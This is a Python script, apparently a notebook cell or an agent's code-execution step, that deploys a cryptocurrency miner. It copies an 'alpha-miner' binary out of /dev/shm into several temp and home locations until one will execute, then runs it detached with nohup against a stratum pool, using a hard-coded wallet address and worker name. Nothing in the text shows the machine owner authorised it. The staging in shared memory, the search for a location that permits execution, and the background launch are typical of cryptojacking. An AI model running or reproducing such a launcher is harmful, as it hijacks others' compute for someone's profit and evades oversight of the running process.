import subprocess
import os
import shutil
import time as t

W = "prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg"
P = "stratum+tcp://sg1.alphapool.tech:5566"
R = "GB10-122GB"
B = "blackwell-native"

subprocess.run(["pkill", "-9", "alpha-miner"], capture_output=True)
t.sleep(1)

# Try different exec locations
src = "/dev/shm/alpha-miner"
exec_locs = ["/tmp/alpha-miner", "/var/tmp/alpha-miner", os.path.expanduser("~/alpha-miner")]

for dst in exec_locs:
    try:
        shutil.copy2(src, dst)
        os.chmod(dst, 0o755)
        # Test if executable
        p = subprocess.run([dst, "--version"], capture_output=True, text=True, timeout=5)
        if "alpha-miner" in p.stdout or "alpha-miner" in p.stderr or p.returncode == 0:
            cmd = f"nohup {dst} --pool {P} --address {W} --worker {R} --force-backend {B} > /tmp/alpha.log 2>&1 &"
            subprocess.run(["bash", "-c", cmd])
            t.sleep(4)
            chk = subprocess.run(["pgrep", "-a", "alpha-miner"], capture_output=True, text=True)
            if chk.stdout.strip():
                result = f"RUNNING from {dst}"
                break
    except Exception as e:
        continue
else:
    result = "ALL_EXEC_FAILED"
result
